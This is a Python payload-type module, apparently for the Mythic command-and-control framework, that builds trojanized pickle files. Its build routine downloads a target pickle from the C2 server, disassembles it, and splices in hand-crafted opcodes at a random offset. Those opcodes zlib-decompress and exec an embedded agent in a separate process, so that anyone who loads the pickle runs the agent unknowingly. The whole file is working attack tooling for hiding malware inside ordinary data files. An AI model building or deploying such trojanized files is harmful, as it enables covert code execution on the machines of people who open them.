from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import asyncio
import os
import tempfile
from distutils.dir_util import copy_tree
from pathlib import PurePath
import base64
import mythic_payloadtype_container

import sys
import pickletools
import random
import zlib
import io
import struct
import time
import requests




class ServiceWrapper(PayloadType):
    name = "pickle_wrapper"
    file_extension = "pkl"
    author = "@coldwaterq"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = True
    sys.stdout.flush()
    wrapped_payloads = []
    note = "This is a wrapper payload that takes in python code and injects it into a pickle."
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="target",
            parameter_type=BuildParameterType.String,
            default_value="TARGET_NAME",
            description="Pickle to target pulled from the files on the C2. Grabbing the most recent file matching *TARGET_NAME*",
        )
    ]
    c2_profiles = []

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)
        output = ""
        # this function gets called to create an instance of your payload

        try:
            file_resp = await MythicRPC().execute("get_file_for_wrapper",  filename=self.get_parameter("target"), get_contents=False)
            if file_resp.status == MythicRPCStatus.Success:
                # this is a successful fetch
                # contents are in file_resp.response["contents"]
                # filename is in file_resp.response["filename"]
                # if you want to see all of the available fields, print(file_resp.response) and you might have to import sys at the top and do sys.stdout.flush() to be able to see it via `./mythic-cli logs [payload type]`
                uuid = file_resp.response["agent_file_id"]
            else:
                # something went wrong, error is in file_resp.error
                raise Exception(str(file_resp.error) + "\n" + output)
            mythic_base_address = os.environ['MYTHIC_ADDRESS'].partition('/api')[0]
            fresp = requests.get(f"{mythic_base_address}/direct/download/{uuid}")
            content = fresp.content
            inf = io.BytesIO(content)

            # shutil to copy payload files over
            agent = base64.b64decode(self.wrapped_payload)

            code = b'from multiprocessing import Process\np = Process(target=exec, args=("""'+agent+b'""",{"__name__":"__main__"}, ))\np.start()'
            data = zlib.compress(code,level=9)

            # create the payload, the shellcode resolves to this.
            # zlib decompress the blob and python exec it.
            # the proto at the beginning and end change it to two, and back to what it was
            # that just ensures consistancy in case other versions make this less effective.
            # 94250272: \x80                                             PROTO      2
            # 94250274: c                                                GLOBAL     '__builtin__ exec'
            # 94250292: (                                                MARK
            # 94250293: c                                                    GLOBAL     'zlib decompress'
            # 94250310: (                                                    MARK
            # 94250311: B                                                        BINBYTES   b'x\xda\xac...\x80\x12'
            # 94282393: t                                                        TUPLE      (MARK at 94250310)
            # 94282394: R                                                    REDUCE
            # 94282395: t                                                    TUPLE      (MARK at 94250292)
            # 94282396: R                                                REDUCE
            # 94282397: 0                                                POP
            # 94282398: \x80                                             PROTO      4
            payload = bytearray(b'\x80\x02c__builtin__\nexec\n(czlib\ndecompress\n(B'+struct.pack("<I",len(data))+data+b'tRtR0\x80')


            # dissasemble the target pickle
            temp = tempfile.TemporaryFile("w+",suffix=self.uuid)
            while inf.tell() != len(content):
                try:
                    pickletools.dis(inf, temp)
                except Exception as e:
                    output += str(e)+"\n"
                    break

            # get a list of loctaions and the "highest protocol" from the disassembly
            temp.seek(0)    
            locations = temp.read().split('\n')
            temp.seek(0)
            version = int(temp.read().partition('highest protocol among opcodes = ')[2].partition('\n')[0])
            temp.close()
            if len(locations)<5:
                resp.build_stderr = "This doesn't appear to be a parsable as a pickle"
                return resp

            # append the version so that it is set at the end. the shell code doesn't define what it's being set back to until this point.
            payload.append(version)

            # pick a random opcode and inject our shellcode before it.
            # since pickle opcodes are location independent and our shellcode cleans up the stack, we can inject anywhere and it shouldn't affect a thing.
            pos = None
            while pos == None:
                loc = random.choice(locations)
                try:
                    pos=int(loc.partition(":")[0])
                except:
                    output += str(loc)+ ' didn\'t work, trying again\n'

            # simply write the target to the output file up to the injection location, write the shellcode to the output, and then write everything left in the target to the output.
            inf.seek(0)
            output += "injecting at "+str(pos)+"\n"
            outf = inf.read(pos)
            outf+=payload
            outf+=inf.read()

            
            resp.payload = outf
            resp.status = BuildStatus.Success
            resp.build_message = f"Pickle with embeded agent created!\n{output}"
        except Exception as e:
            raise Exception(str(e) + "\n" + output)
        return resp
